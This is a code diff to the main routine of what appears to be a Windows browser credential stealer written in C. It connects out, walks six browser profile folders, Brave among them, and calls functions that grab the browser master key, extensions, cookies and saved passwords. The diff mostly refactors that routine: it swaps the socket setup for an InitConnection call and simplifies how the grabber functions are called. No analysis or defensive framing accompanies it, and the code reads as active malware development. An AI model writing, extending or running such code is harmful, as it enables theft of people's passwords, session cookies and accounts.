@@ -8,19 +8,15 @@
 #include "../include/SendData.h"
 
 #include <windows.h>
-#include <stdio.h>
 
 #define BROWSERS 6
-
-extern unsigned long long hSocket;
 
 int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
     HANDLE              FolderHandle      = {0};
     unsigned short      FolderPath[256]   = {0};
+    int                 idx               = 0;
 
-    InitSocket();
-    if (hSocket == -1) {
-        printf("no internet\n");
+    if (InitConnection() == -1) {
         return 1;
     }
 
@@ -33,16 +29,15 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		L"\\BraveSoftware\\Brave-Browser\\User Data"
     };
 
-    int i = 0;
-    while (i < BROWSERS) {
-        InitPath(paths[i], FolderPath);
+    while (idx < BROWSERS) {
+        InitPath(paths[idx], FolderPath);
         if (OpenFolder(&FolderHandle, FolderPath) == 0) {
             GrabMasterKey(FolderPath);
             ExtensionsGrabber(FolderPath);
-            GrabCookies(FolderPath, lenW(FolderPath));
-            GrabPassword(FolderPath, lenW(FolderPath));
+            GrabCookies(FolderPath);
+            GrabPassword(FolderPath);
         }
-        i++;
+        idx++;
     }
 
     return 0;
